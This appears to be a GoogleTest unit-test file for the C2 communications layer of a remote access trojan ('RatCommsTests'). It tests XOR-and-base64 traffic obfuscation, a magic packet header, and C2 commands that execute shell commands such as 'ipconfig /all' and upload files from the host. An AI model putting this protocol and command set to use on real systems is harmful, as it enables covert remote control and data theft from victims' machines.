#include "comms.hpp"
#include <gtest/gtest.h>

// fixture for disabled encryption
class EncryptionDisabledTests : public ::testing::Test {
protected:
    

    void SetUp() override
    {
        Settings::ENCRYPT_COMMS = false;
    }

    void TearDown() override
    {
        Settings::ENCRYPT_COMMS = true;
    }
};

TEST(RatCommsTests, SetPacketData) {

    Communication::TCP::Packet pkt;

    ASSERT_NO_THROW(pkt.SetPacketData("test_data"));
}

TEST(RatCommsTests, GetPacketData) {


    Communication::TCP::Packet pkt;
    pkt.SetPacketData(R"({"header":"test_data"})");

    std::string pktData = pkt.GetPacketData()["header"];
    std::string test_data = "test_data";

    EXPECT_STREQ(pktData.c_str(), test_data.c_str());
}

TEST(RatCommsTests, EncryptPacketData) {


    Communication::TCP::Packet pkt;
    pkt.SetPacketData(R"({"header":"test_data"})");

    pkt.EncryptPacketData();
    std::string encrypted = pkt.GetPacketString();

    std::string expected = "dCJoaG5kZX8tOiJ5anN0UmthdGwtfQ==";

    // The expected string relies on a specific XOR key. If the XOR key is changed in settings this test will fail.
    // Collect a new expected string by XOR + base64 or do this dynamically with std::string encrypted = pkt.GetPacketString().
    EXPECT_STREQ(encrypted.c_str(), expected.c_str());
}

TEST(RatCommsTests, DecryptPacketData) {

    Communication::TCP::Packet pkt;
    pkt.SetPacketData(R"({"header":"test_data"})");
    pkt.EncryptPacketData();

    pkt.DecryptPacketData();
    std::string decrypted = pkt.GetPacketString();
    std::string test_data = R"({"header":"test_data"})";

    EXPECT_STREQ(decrypted.c_str(), test_data.c_str());
}

TEST(RatCommsTests, GetPacketString) {


    Communication::TCP::Packet pkt;
    pkt.SetPacketData(R"({"header":"test_data"})");

    std::string pktData = pkt.GetPacketString();
    std::string test_data = R"({"header":"test_data"})";

    EXPECT_STREQ(pktData.c_str(), test_data.c_str());
}

TEST(RatCommsTests, PacketFormat) {


    Communication::TCP::Packet pkt;
    std::string example_json = R"({"header":"test_data"})";
    pkt.SetPacketData(example_json);

   
    std::string pktData = pkt.GetPacketData()["header"];
    
    std::string test_data = "test_data";

    EXPECT_STREQ(pktData.c_str(), test_data.c_str());
}

TEST_F(EncryptionDisabledTests, HandleUnknownCommand) {

    Communication::TCP::Packet pkt;
    std::string example_json = R"({"header":"0xC0DE0000","command":99})";
    pkt.SetPacketData(example_json);


    EXPECT_EQ(Communication::HandleC2Response(pkt), 1);
}

TEST(RatCommsTests, HandleInvalidHeader) {

    Communication::TCP::Packet pkt;
    std::string example_json = R"({"header":"invalid","command":"24"})";
    pkt.SetPacketData(example_json);


    EXPECT_EQ(Communication::HandleC2Response(pkt), 1);
}

TEST_F(EncryptionDisabledTests, HandleValidCommand) {

    Communication::TCP::Packet pkt;;
    std::string raw = R"({"header":"0xC0DE0000","command":"52"})";
    auto data = nlohmann::json::parse(raw);
    data["header"] = Settings::HEADER;
    pkt.SetPacketData(data.dump());


    EXPECT_EQ(Communication::HandleC2Response(pkt), 0);
}

TEST(RatCommsTests, HandleInvalidPacket) {

    Communication::TCP::Packet pkt;
    std::string example_json = R"({"header":"0xC0DE0000"})";
    pkt.SetPacketData(example_json);


    EXPECT_EQ(Communication::HandleC2Response(pkt), 1);
}

TEST(RatCommsTests, AddPacketField) {


    Communication::TCP::Packet pkt;
    std::string example_json = R"({"header":"0xC0DE0000"})";

    pkt.AddPacketField("test", "test_data");

    std::string pktData = pkt.GetPacketData()["test"];
    std::string compare = "test_data";

    EXPECT_STREQ(pktData.c_str(), compare.c_str());
}

TEST(RatCommsTests, AddFieldToEmptyPacket) {

    Communication::TCP::Packet pkt;

    pkt.AddPacketField("test", "test_data");

    std::string pktData = pkt.GetPacketData()["test"];
    std::string compare = "test_data";

    EXPECT_STREQ(pktData.c_str(), compare.c_str());
}

TEST_F(EncryptionDisabledTests, cmdExecCommandSendResponse) {

    Communication::TCP::Packet pkt;
    std::string raw = R"({"header":"0xC0DE0000","command":"2", "execute":"ipconfig /all"})";
    auto data = nlohmann::json::parse(raw);
    data["header"] = Settings::HEADER;
    pkt.SetPacketData(data.dump());

    EXPECT_EQ(Communication::HandleC2Response(pkt), 0);
}

TEST_F(EncryptionDisabledTests, cmdUploadCommandSend) {

    Communication::TCP::Packet pkt;
    std::string raw = R"({"header":"0xC0DE0000","command":"24", "filePath":"uploadme.txt"})";
    auto data = nlohmann::json::parse(raw);
    data["header"] = Settings::HEADER;
    pkt.SetPacketData(data.dump());

    if (Commands::cmdCreateFile("uploadme.txt", "dGVzdF9kYXRh") == 0) {
        EXPECT_EQ(Communication::HandleC2Response(pkt), 0);
    }
    
}

TEST(RatCommsTests, cmdExecCommandInvalidFormat) {

    Communication::TCP::Packet pkt;
    std::string raw = R"({"header":"0xC0DE0000","command":"2"})";
    auto data = nlohmann::json::parse(raw);
    data["header"] = Settings::HEADER;
    pkt.SetPacketData(data.dump());

    EXPECT_EQ(Communication::HandleC2Response(pkt), 1);
}


TEST(RatCommsTests, cmdExecCommandInvalidArgumentFormat) {

    Communication::TCP::Packet pkt;
    std::string raw = R"({"header":"0xC0DE0000","command":"2", "arguments":"whoami"})";
    auto data = nlohmann::json::parse(raw);
    data["header"] = Settings::HEADER;
    pkt.SetPacketData(data.dump());

    EXPECT_EQ(Communication::HandleC2Response(pkt), 1);
}